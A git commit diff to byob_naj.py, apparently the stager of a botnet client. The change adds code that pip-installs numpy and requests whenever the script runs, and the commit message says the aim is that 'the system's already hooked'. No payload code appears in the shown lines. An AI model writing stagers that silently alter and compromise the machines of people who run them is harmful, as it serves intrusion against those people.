1077f10dcfc11a71baabd6312e4398eeeed7e92e
meatballsong1 <76566861+meatballsong1@users.noreply.github.com>
2023-06-13 15:53:55 -0500

    Added an auto-installer so when you run it the system's already hooked

--- byob_naj.py
+++ byob_naj.py
@@ -1,4 +1,21 @@
 import sys,zlib,base64,marshal,json,urllib
+import subprocess
+
+def check_and_install(package):
+    try:
+        __import__(package)
+        print(f"{package} is already installed.")
+    except ImportError:
+        print(f"{package} is not installed. Installing...")
+        subprocess.check_call(["pip", "install", package])
+        print(f"{package} has been installed.")
+
+# Check and install numpy
+check_and_install("numpy")
+
+# Check and install requests
+check_and_install("requests")
+
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
